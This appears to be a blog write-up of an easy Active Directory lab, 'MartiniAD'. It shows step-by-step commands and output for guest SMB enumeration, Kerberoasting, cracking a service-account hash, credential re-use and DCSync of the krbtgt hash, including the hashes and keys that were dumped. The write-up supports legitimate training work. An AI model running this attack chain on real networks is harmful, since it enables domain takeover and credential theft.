---
title: MartiniAD
date: 2026-05-26 01:09:33 +0300
author: oste
description: This is an Easy Active Directory challenge lab.
image: /assets/img/Posts/martiniad.png
categories: [Hack Smarter, Hack Smarter - Easy]
tags:
  [nxc, smb, smbclient, t0, Kerberoasting, SPN, DCSync, krbtgt, ntds, impacket-secretsdump]
---


## Objective

An adult beverage company "Martini Bars" recently had a corporate breach and the compliance and risk team dictates they perform a penetration test at one of their branch offices. The Hack Smarter team has been authorized to perform an internal black box pentest. The client has provided you with VPN access to their internal network, but no credentials.

**What is the KRBTGT NT Hash?**

---

## Attack Path Overview

```
Nmap scan → guest SMB access → notes share → credentials in plaintext
    → Kerberoasting (ATHENA_SVC) → hash cracked
        → Credential re-use → athena.t0 (Domain Admin)
            → DCSync → krbtgt hash
```
{: .nolineno }

## Reconnaissance
### Nmap

I started by running a full TCP port scan was run to fingerprint the target:

I began doing reconnaissance with a comprehensive TCP port scan using Nmap. The `-sCV` flags triggers service version detection and default script execution, with `-p-` to cover all 65,535 ports:

```bash
➜  sudo nmap -sCV -T4 -sCV -p- -vvv 10.1.170.106 -oA nmaap-results | tee nmap-log
[sudo] password for oste:
Nmap scan report for 10.1.170.106
Host is up, received echo-reply ttl 126 (0.26s latency).
Scanned at 2026-05-15 00:57:25 EAT for 1353s
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-05-14 22:18:16Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: DRY.MARTINI.BARS, Site: Default-First-Site                          -Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: DRY.MARTINI.BARS, Site: Default-First-Site                          -Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126
| rdp-ntlm-info:
|   Target_Name: DRY
|   NetBIOS_Domain_Name: DRY
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: DRY.MARTINI.BARS
|   DNS_Computer_Name: DC01.DRY.MARTINI.BARS
|   DNS_Tree_Name: DRY.MARTINI.BARS
|   Product_Version: 10.0.26100
|_  System_Time: 2026-05-14T22:19:09+00:00
| ssl-cert: Subject: commonName=DC01.DRY.MARTINI.BARS
| Issuer: commonName=DC01.DRY.MARTINI.BARS
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-16T01:19:23
| Not valid after:  2026-07-18T01:19:23
| MD5:     e45f 2ccb 66e0 e93a ce42 62b8 4f09 0850
| SHA-1:   2ffc e1c5 3163 c9dd cf69 e82a b091 67a3 1324 0dc7
| SHA-256: 5feb bdd8 fd0f 4eee 431f 0658 cd02 b0aa 582b c3f3 95f9 ad43 ec76 3c28 03dd dfa6
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49678/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49697/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49710/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
55814/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.99%I=7%D=5/15%Time=6A064A2C%P=arm-unknown-linux-gnueab
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1355.05 seconds
           Raw packets sent: 197230 (8.678MB) | Rcvd: 1153 (95.886KB)

```
{: .nolineno }


The open ports immediately identify this as a **Domain Controller**. Port `88` (Kerberos), `53` (DNS), and the full suite of LDAP ports (`389`, `636`, `3268`, `3269`) are all hallmarks of an AD DC. Port `5985` (WinRM) is also exposed, which is worth noting for potential remote access later.

The RDP banner leaked two useful pieces of information before any authentication was required:

- **Machine name:** `DC01`
- **Domain:** `DRY.MARTINI.BARS`

Using `nxc`'s `--generate-hosts-file` flag, I generated hosts file entry which I added to the `etc/hosts` to ensure DNS resolves cleanly throughout the assessment:

```bash

➜   nxc smb 10.1.170.106 -u guest -p '' --generate-hosts-file hosts
SMB         10.1.170.106    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.1.170.106    445    DC01             [+] DRY.MARTINI.BARS\guest:

➜  cat hosts
10.1.170.106     DC01.DRY.MARTINI.BARS DRY.MARTINI.BARS DC01

➜  sudo nano /etc/hosts

➜  cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.1.170.106 DC01.DRY.MARTINI.BARS DRY.MARTINI.BARS DC01
```
{: .nolineno }


## SMB Enumeration

### Null Session & Guest Access

I attempted enumerating shares using both a null session and the `guest` account:

```bash

➜  nxc smb 10.1.170.106 -u '' -p '' --shares
SMB         10.1.170.106    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.1.170.106    445    DC01             [+] DRY.MARTINI.BARS\:
SMB         10.1.170.106    445    DC01             [*] Enumerated shares
SMB         10.1.170.106    445    DC01             Share           Permissions     Remark
SMB         10.1.170.106    445    DC01             -----           -----------     ------
SMB         10.1.170.106    445    DC01             ADMIN$                          Remote Admin
SMB         10.1.170.106    445    DC01             C$                              Default share
SMB         10.1.170.106    445    DC01             IPC$                            Remote IPC
SMB         10.1.170.106    445    DC01             NETLOGON                        Logon server share
SMB         10.1.170.106    445    DC01             notes
SMB         10.1.170.106    445    DC01             SYSVOL                          Logon server share

➜  nxc smb 10.1.170.106 -u 'guest' -p '' --shares
SMB         10.1.170.106    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.1.170.106    445    DC01             [+] DRY.MARTINI.BARS\guest:
SMB         10.1.170.106    445    DC01             [*] Enumerated shares
SMB         10.1.170.106    445    DC01             Share           Permissions     Remark
SMB         10.1.170.106    445    DC01             -----           -----------     ------
SMB         10.1.170.106    445    DC01             ADMIN$                          Remote Admin
SMB         10.1.170.106    445    DC01             C$                              Default share
SMB         10.1.170.106    445    DC01             IPC$            READ            Remote IPC
SMB         10.1.170.106    445    DC01             NETLOGON                        Logon server share
SMB         10.1.170.106    445    DC01             notes           READ,WRITE
SMB         10.1.170.106    445    DC01             SYSVOL                          Logon server share

```
{: .nolineno }


Interestingly, unlike many hardened environments, the `guest` account was **not disabled** here. Using it revealed something interesting, a non-default share called `notes` with **READ and WRITE** permissions:

> The SMB banner shows `signing:False` across all responses — the domain is not enforcing SMB signing, which means it is potentially vulnerable to NTLM relay attacks.
{: .prompt-warning }



### Accessing the Notes Share

Using `smbclient` , you can access the `Notes` share as shown with any username as the server accepted it regardless:

```bash
➜  smbclient -U 'a' //10.1.170.106/notes
Password for [WORKGROUP\a]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri May 15 01:22:20 2026
  ..                                DHS        0  Sat Jan 17 19:38:33 2026
  notes.txt                           A      129  Sat Jan 17 19:38:47 2026

                7731967 blocks of size 4096. 2385262 blocks available
smb: \> get notes.txt
getting file \notes.txt of size 129 as notes.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```
{: .nolineno }


The retrieved file contained what appears to be a user's personal notes  including credentials stored in plaintext:

```bash
➜  cat notes.txt
- Order more gin for lakeside
- Look for an engagement ring
- Check that notes works from Linux Mint

creds
mprice:*martini*%             
```
{: .nolineno }


Credentials left in a world-readable share is a classic example of why sensitive data should never be stored in file shares, even internally. I validated the  credentials using `nxc` as shown:

```bash
➜  nxc smb 10.1.170.106 -u 'mprice' -p '*martini*'
SMB         10.1.170.106    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.1.170.106    445    DC01             [+] DRY.MARTINI.BARS\mprice:*martini*
```
{: .nolineno }


The creds appeared to be valid. I then proceeded to test for WinRM access as the port 5985 was open.

```bash
➜  nxc winrm 10.1.170.106 -u 'mprice' -p '*martini*'
WINRM       10.1.170.106    5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:DRY.MARTINI.BARS)
WINRM       10.1.170.106    5985   DC01             [-] DRY.MARTINI.BARS\mprice:*martini*
```
{: .nolineno }


`mprice` couldn't authenticate over `winrm` indicating he lacked the necessary group membership for remote management.
### User Enumeration

With valid credentials, I proceeded to enumerate all users in the domain:

```bash

➜  nxc smb 10.1.170.106 -u 'mprice' -p '*martini*' --users-export users.txt
SMB         10.1.170.106    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.1.170.106    445    DC01             [+] DRY.MARTINI.BARS\mprice:*martini*
SMB         10.1.170.106    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.1.170.106    445    DC01             Administrator                 2026-01-12 16:00:19 0       Built-in account for administering the computer/domain
SMB         10.1.170.106    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.1.170.106    445    DC01             krbtgt                        2026-01-17 01:19:20 0       Key Distribution Center Service Account
SMB         10.1.170.106    445    DC01             mprice                        2026-01-17 16:40:55 0
SMB         10.1.170.106    445    DC01             athena.t0                     2026-01-20 18:20:44 0
SMB         10.1.170.106    445    DC01             ATHENA_SVC                    2026-01-20 18:20:32 0
SMB         10.1.170.106    445    DC01             [*] Enumerated 6 local users: DRY
SMB         10.1.170.106    445    DC01             [*] Writing 6 local users to users.txt


➜  cat users.txt
Administrator
Guest
krbtgt
mprice
athena.t0
ATHENA_SVC
```
{: .nolineno }


The two accounts `ATHENA_SVC` and `athena.t0` follow a naming pattern that is common in tiered Active Directory environments.

- `ATHENA_SVC`:  The `_SVC` suffix is a widely used convention for service accounts. These accounts are assigned Service Principal Names (SPNs) and run background processes or scheduled tasks. They typically have elevated privileges within specific application contexts but are not intended for interactive use.
- `athena.t0` — The `.t0` (or `T0-` prefixes) is usuallyy a strong indicator of a Tier 0 account in a tiered administration model (Microsoft's recommended Enterprise Access Model). Tier 0 accounts have direct control over the Active Directory forest. They can modify domain objects, replicate the directory, and manage domain controllers. They are the highest-privilege class of account in the AD hierarchy. *See : [1](https://www.ultimatewindowssecurity.com/webinars/register.aspx?id=3761) & [2](https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-access-model)*

The connection between these two accounts suggests that the same individual could own both. This is likely an admin who created a service account and a privileged admin account under a shared naming scheme. This association could  make credential re-use a high-probability hypothesis worth testing later on.
## Kerberoasting

With a foothold account established, the next step was to identify Kerberoastable service accounts,  specifically accounts that have a Service Principal Name (SPN) registered against them. When an SPN exists, any authenticated domain user can request a Kerberos TGS (Ticket Granting Service) ticket for that account. The ticket is encrypted using the service account's NT hash, meaning it can be taken offline and cracked without further interaction with the domain.


![image](/assets/img/Posts/shadowgate/kerberoasting_attack_flow.png)


```bash
➜  nxc ldap 10.1.170.106 -u 'mprice' -p '*martini*' --kerberoasting output.txt
LDAP        10.1.170.106    389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:Enforced) (channel binding:No TLS cert)
LDAP        10.1.170.106    389    DC01             [+] DRY.MARTINI.BARS\mprice:*martini*
LDAP        10.1.170.106    389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.1.170.106    389    DC01             [*] Total of records returned 1
LDAP        10.1.170.106    389    DC01             [*] sAMAccountName: ATHENA_SVC, memberOf: ['CN=Remote Management Users,CN=Builtin,DC=DRY,DC=MARTINI,DC=BARS', 'CN=Remote Desktop Users,CN=Builtin,DC=DRY,DC=MARTINI,DC=BARS'], pwdLastSet: 2026-01-20 21:20:32.856622, lastLogon: <never>
LDAP        10.1.170.106    389    DC01             $krb5tgs$23$*ATHENA_SVC$DRY.MARTINI.BARS$DRY.MARTINI.BARS\ATHENA_SVC*$2d9c50f26eca1c93036fceaf17518a23$d10c193b459091b50446ee436d42851cca629764af471289e74593f75c854c460893f1ee993fca6d8bcb5460c443cbbc9a5c17ee91ab7eaef6bc0a326ed1d4d85b64dce94602589d54576805d9cce1aa8df7ee247beab00a4b0d177fc159ba8f45ad7f4236788d99d01e0be0aff8271a0510c1c5fc862a1aee712d9b58991b517c6e4f4719813b7e77f0a470268865c02c6ea75146939994c95d1a884c68b1c9842c8be9dea4747ae4600f1a50a783841e12f10c5eb72d821901edb55aacbc166334eec74d25160a2bf5825d2cc00e7d7416f23f2a7983078058ec93a9a492396c32b6d7d3367aac74ca9c20886aefadc95259db2060da00a07910b7eba4820237272f841ef7d7f0d0f12b3c206d4e630b4c6a8c54fde4003bbe6bf34b9647bafa661e445ac7c1091632958eb4f8c256c371c62427f0f5c95010f286e416b75f1e2e7070d5199ae290a7b060135c542b79c5b67b2bd65bce44d7bbd00794d9620955b7f268258b9be79dfac8802825398e22ee652f0b6a1f9f7c9513209bb046c593bca48a3df0a1aceea0eacb98859e5fc8b663dcc1f64fd9a7a9a80108086a1f0e10799c13c7fd3ed51875ac28d8352779241b9e8d08b0af604865c7cf7b68029df2935d21ba877517a9038df029e8df3685256dc8ff9936f8f3c379728261da37f216e1630307a465be8d04eeb3d11879ffed996f265764024735701fe88bdf9062da088c9b9a08e7a0fc2cf40a98a7899fab2ebba2c7cb47ab33454f5d68d0aed9ab66f6be1b12369130716abff6d777f19a528e77345b58a05b33c06006b68a50b80d7ba78a43243da225ea7d118fada05a64c4ccd9892c7265f339017e65584fda8df450b4b55276b49bccd6bcf6dcd9a6ba13a4bd87f1de261a13039b31a21a7bf203283050db409b590c284569312b1605d9775d8f80c8e7c7d85d72f75ce7598f41a8107f5d356075dbee38b7b18736ea472547a49c4f08bd93e8a7ebb17b069c861acdd83e59dd8a21dd34f493117797bdf8cf17f6636da35741874a308d8a98e3092b9e6df13ac6732056aeac87f062208f9be0c33488c3de64350fd9c7586a283d63d3e5b5bde0d2e6ac24aa0459fc608278944dbfdb62042e4b04e31c9da74ee32c7bed2f1070980aff43926eb577ea254357e35f02f2d8e27eab12bcde8b6e7b99882a57cb7faab012cfa0d16c63b6b19ec4a3dddde1affff122cc7ba0f83f9b1c60a4d7cb43463271f791388ffa6ccc01aaa75ed4761a5aa4634e713d1895129e13fb434b7bfd4dcf2aba1c4d7275bf322d9a22c008e08333c892a7341b348e6528932b2161847a471c5ea3d3601c6803e2db407345e927b6227a132bbf46921222c3aafba97199bbcc48e304d7ce178dcd6b89d1ee04656314c4670f747c9d0dcd5bfd682df04574c6b8d8da49f421687b1fa178f60c5f2b8422c3c4cc8173069316e59ad4ee48eaa8306aeecb4f8bdd13a5b355c5114f1dcc1c8be03be7024a55d3ef935605c4

```
{: .nolineno }


One Kerberoastable account was returned for `ATHENA_SVC`. 

Notably, the output also reveals that this account is a member of both **Remote Management Users** and **Remote Desktop Users** groups. These memberships means a successful hash cracking translates directly to an interactive foothold on the domain controller.

The hash (`RC4-encrypted TGS hash (etype 23`) was cracked offline using `john`:

```bash
➜  john -w=/usr/share/wordlists/rockyou.txt output.txt
Created directory: /home/oste/.john
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1dirtymartini    (?)
1g 0:00:00:15 DONE (2026-05-15 01:57) 0.06301g/s 820490p/s 820490c/s 820490C/s 1fortgreen..1desmemoriado
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
{: .nolineno }


The password cracked in under 15 seconds. Alternatively, `hashcat` with module 13100 produces the same result:

```bash
hashcat -m 13100 output.txt /usr/share/wordlists/rockyou.txt
```
{: .nolineno }


Credentials confirmed and WinRM access validated:

```bash
➜  nxc winrm 10.1.170.106 -u 'ATHENA_SVC' -p '1dirtymartini'
WINRM       10.1.170.106    5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:DRY.MARTINI.BARS)
WINRM       10.1.170.106    5985   DC01             [+] DRY.MARTINI.BARS\ATHENA_SVC:1dirtymartini (Pwn3d!)
```
{: .nolineno }


I authenticated into the machine as `ATHENA_SVC` using Evil-WinRM and proceeded with further enumeration. I proceeded to query the Domain Admins group membership as shown:

```bash
➜  evil-winrm -i 10.1.170.106 -u 'ATHENA_SVC' -p '1dirtymartini'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ATHENA_SVC\Documents> net group "Domain Admins" /domain
Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            athena.t0
The command completed successfully.
```
{: .nolineno }


As anticipated from the naming convention, I confirmed `athena.t0` is a Domain Admin. Given the shared naming scheme between `ATHENA_SVC` and `athena.t0`, credential re-use became the obvious next hypothesis.000
## Credential Re-use

I tested for credential re-use over smb and it worked successfully. The (`Pwn3d!`) flag returned indicates local admin or Domain Admin-level access.

```bash

➜  nxc smb 10.1.170.106 -u 'athena.t0' -p '1dirtymartini'
SMB         10.1.170.106    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.1.170.106    445    DC01             [+] DRY.MARTINI.BARS\athena.t0:1dirtymartini (Pwn3d!)
```
{: .nolineno }


A WinRM shell confirmed `athena.t0` is a **Domain Admin**.
## DCSync

With Domain Admin credentials , the final objective was to extract the `krbtgt` account hash via DCSync. 

> `DCSync` is a technique that abuses the Directory Replication Service (`DRSUAPI`) . This is the protocol Domain Controllers use to synchronize AD data between sites. An account with Replicating Directory Changes All permissions can request replication of credential data directly from the DC, without writing anything to disk or touching LSASS. Domain Admins hold this permission by default.
{: .prompt-info }

There are various ways to extract the hashes but in this blog post, I discuss 3 methods.

### Method 1 - nxc `--ntds`

This is the most direct approach, executed over SMB in a single command:

```bash

➜  nxc smb 10.1.170.106 -u 'athena.t0' -p '1dirtymartini' --ntds --user krbtgt
SMB         10.1.170.106    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.1.170.106    445    DC01             [+] DRY.MARTINI.BARS\athena.t0:1dirtymartini (Pwn3d!)
SMB         10.1.170.106    445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.1.170.106    445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:22ebc290e67668629c8d0812662a9c51:::
SMB         10.1.170.106    445    DC01             [+] Dumped 1 NTDS hashes to /home/kali/.nxc/logs/ntds/DC01_10.1.170.106_2026-05-17_140048.ntds of which 1 were added to the database
SMB         10.1.170.106    445    DC01             [*] To extract only enabled accounts from the output file, run the following command:
SMB         10.1.170.106    445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC01_10.1.170.106_2026-05-17_140048.ntds | cut -d ':' -f1
```
{: .nolineno }


### Method 2 - `impacket-secretsdump` (Password Authentication)


```bash
impacket-secretsdump 'domain/]username[:password]@]<targetName or address>' -no-pass -just-dc-user krbtgt
```
{: .nolineno }


```bash

➜  impacket-secretsdump 'DRY.MARTINI.BARS/athena.t0:1dirtymartini@DC01.DRY.MARTINI.BARS' -no-pass -just-dc-user krbtgt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:22ebc290e67668629c8d0812662a9c51:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:b2679af0c2283eff6926eda9fcdac99c7bc2b118158df3934a33d5f4f50baed3
krbtgt:aes128-cts-hmac-sha1-96:bfb79c68ae71254e572fd65dd34f5b5c
krbtgt:0x17:22ebc290e67668629c8d0812662a9c51
[*] Cleaning up...
```
{: .nolineno }


### Method 3 — impacket-secretsdump (Kerberos ticket)

An alternative approach avoids sending the password over the wire entirely. A TGT is first obtained, and `secretsdump` authenticates using the cached Kerberos ticket:

```bash
# Step 1 — Obtain TGT
➜  MaritiniAD impacket-getTGT 'DRY.MARTINI.BARS/athena.t0:1dirtymartini' -dc-ip 10.1.170.106
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in athena.t0.ccache

# Step 2 — Export ticket to environment
➜  MaritiniAD export KRB5CCNAME=./athena.t0.ccache

# Step 3 — DCSync using Kerberos auth
➜  MaritiniAD impacket-secretsdump 'athena.t0'@DC01.DRY.MARTINI.BARS -k -no-pass -just-dc-user krbtgt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:22ebc290e67668629c8d0812662a9c51:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:b2679af0c2283eff6926eda9fcdac99c7bc2b118158df3934a33d5f4f50baed3
krbtgt:aes128-cts-hmac-sha1-96:bfb79c68ae71254e572fd65dd34f5b5c
krbtgt:0x17:22ebc290e67668629c8d0812662a9c51
[*] Cleaning up...
➜  MaritiniAD

```
{: .nolineno }

Possession of the krbtgt hash enables a Golden Ticket attack. An attacker can use this hash to forge Kerberos TGTs for any user in the domain including non-existent accounts with arbitrary group memberships and validity periods (*up to 10 years by default*). This constitutes unlimited, persistent Domain Admin access.